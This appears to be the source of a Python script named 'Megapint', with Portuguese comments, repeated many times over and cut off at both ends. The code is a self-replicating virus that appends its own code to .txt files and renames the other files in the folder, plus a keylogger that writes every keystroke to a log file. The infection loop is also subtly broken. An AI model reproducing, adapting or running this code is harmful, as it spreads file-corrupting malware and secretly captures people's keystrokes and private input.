        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
